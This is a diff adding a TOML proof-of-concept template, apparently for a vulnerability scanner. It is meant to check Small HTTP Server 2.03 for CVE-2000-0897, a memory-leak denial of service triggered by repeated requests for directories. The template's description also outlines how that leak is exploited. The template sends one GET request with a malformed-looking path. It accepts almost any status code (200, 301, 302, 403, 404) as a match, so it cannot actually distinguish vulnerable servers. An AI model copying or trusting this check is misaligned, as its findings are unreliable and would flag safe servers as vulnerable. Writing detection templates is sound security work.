@@ -1,0 +1,30 @@
+[info]
+author = "ave"
+description = "验证 Small HTTP Server 2.03 及更早版本是否存在拒绝服务漏洞：向目标服务器发送针对不含 index.html 文件的目录路径的 HTTP GET 请求，服务器会分配内存处理该请求但请求完成后不释放，反复请求将耗尽系统内存导致服务中断。"
+id = "POC-AVE-2000-0653"
+name = "Small HTTP Server 2.03 Directory Request Memory Leak DoS PoC"
+severity = "medium"
+tags = ["ave-2000-0653"]
+vuln_id = [
+    "CVE-2000-0897",
+    "AVE-2000-0653",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/nonexistent-dir/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    301,
+    302,
+    403,
+    404,
+]
+type = "status"
